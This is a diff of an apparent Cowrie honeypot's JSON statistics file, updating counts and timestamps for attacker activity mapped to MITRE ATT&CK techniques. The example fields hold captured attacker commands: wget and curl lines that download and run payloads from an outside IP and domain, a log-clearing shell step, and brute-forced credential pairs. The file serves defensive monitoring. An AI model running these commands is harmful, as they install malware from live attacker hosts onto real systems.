@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-10-17 03:05:33",
+  "generated": "2026-10-17 04:05:53",
   "totals": {
-    "commands": 308454,
-    "login_failed": 457966,
-    "login_success": 69538,
-    "sessions": 474462
+    "commands": 308486,
+    "login_failed": 458144,
+    "login_success": 69539,
+    "sessions": 474656
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 457966,
+      "count": 458144,
       "examples": [
         "root / 123456",
         "nobody / None",
@@ -21,14 +21,14 @@
         "admin / admin"
       ],
       "first": "2026-08-10T23:55:42.664651Z",
-      "last": "2026-10-17T03:05:29.156452Z",
-      "unique_ips": 6802
+      "last": "2026-10-17T04:04:25.057467Z",
+      "unique_ips": 6803
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 69538,
+      "count": 69539,
       "examples": [
         "root / admin",
         "uname -a / exit",
@@ -37,8 +37,8 @@
         "admin / vertex25ektks123"
       ],
       "first": "2026-08-10T23:55:55.666658Z",
-      "last": "2026-10-17T03:03:50.466285Z",
-      "unique_ips": 5570
+      "last": "2026-10-17T03:39:12.282692Z",
+      "unique_ips": 5571
     },
     {
       "id": "T1222.002",
@@ -76,7 +76,7 @@
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 12276,
+      "count": 12295,
       "examples": [
         "(wget http://77.90.185.66/wget -O- || busybox wget http://77.90.185.66/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://77.90.185.66/wget",
@@ -85,8 +85,8 @@
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh"
       ],
       "first": "2026-08-11T00:40:37.931453Z",
-      "last": "2026-10-17T03:04:00.949291Z",
-      "unique_ips": 1889
+      "last": "2026-10-17T03:42:12.301954Z",
+      "unique_ips": 1890
     },
     {
       "id": "T1082",
@@ -202,13 +202,13 @@
       "id": "T1070.002",
       "name": "Indicator Removal: Clear Linux or Mac System Logs",
       "tactic": "Defense Evasion",
-      "count": 132,
+      "count": 133,
       "examples": [
         "/bin/busybox echo > /var/log/.b && sh /var/log/.b && cd /var/log/"
       ],
       "first": "2026-10-11T02:43:06.449587Z",
-      "last": "2026-10-17T02:10:47.298073Z",
-      "unique_ips": 76
+      "last": "2026-10-17T03:41:05.680925Z",
+      "unique_ips": 77
     },
     {
       "id": "T1087.001",
@@ -336,19 +336,19 @@
   "unmapped": [
     [
       "sh",
-      62883
+      62884
     ],
     [
       "system",
-      62363
+      62364
     ],
     [
       "shell",
-      38843
+      38844
     ],
     [
       "/bin/busybox",
-      9899
+      9901
     ],
     [
       "/bin/busybox HISILICON",
@@ -356,7 +356,7 @@
     ],
     [
       "enable",
-      4730
+      4731
     ],
     [
       "ping; sh",
@@ -380,11 +380,11 @@
     ],
     [
       "linuxshell",
-      1047
+      1048
     ],
     [
       "ping ;sh",
-      842
+      843
     ],
     [
       "cd /proc && cat self/cmdline",
@@ -417,10 +417,10 @@
   ],
   "data_since": "2026-08-10T23:55:42",
   "last_24h": {
-    "sessions": 7937,
-    "logins": 7602,
-    "commands": 1756,
-    "downloads": 424,
-    "unique_ips": 264
+    "logins": 7407,
+    "sessions": 7725,
+    "commands": 1788,
+    "downloads": 443,
+    "unique_ips": 258
   }
 }
